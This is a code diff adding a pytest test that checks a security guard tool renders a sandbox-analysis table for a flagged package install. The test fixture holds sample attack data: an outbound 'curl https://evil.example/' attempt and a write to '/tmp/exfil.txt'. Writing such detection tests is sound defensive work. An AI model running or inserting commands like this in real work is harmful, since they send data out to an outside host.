@@ -684,3 +684,28 @@ def test_emit_guard_payload_renders_safe_decode_risks_table(capsys, monkeypatch)
     output = capsys.readouterr().out
     assert "Encoded payload risks" in output
     assert "1 signal(s)" in output
+
+
+def test_emit_guard_payload_renders_sandbox_analysis_table(capsys, monkeypatch) -> None:
+    monkeypatch.setattr(render, "_RICH_AVAILABLE", True)
+    emit_guard_payload(
+        "install",
+        {
+            "sandbox_analysis": [
+                {
+                    "signals_detected": ["network.outbound"],
+                    "writes": ["/tmp/exfil.txt"],
+                    "network_attempts": ["curl https://evil.example/"],
+                    "process_attempts": [],
+                    "timed_out": False,
+                    "exit_code": 0,
+                    "duration_ms": 42.0,
+                    "failure_safe": False,
+                }
+            ]
+        },
+        False,
+    )
+    output = capsys.readouterr().out
+    assert "Sandbox analysis" in output
+    assert "1 result(s)" in output
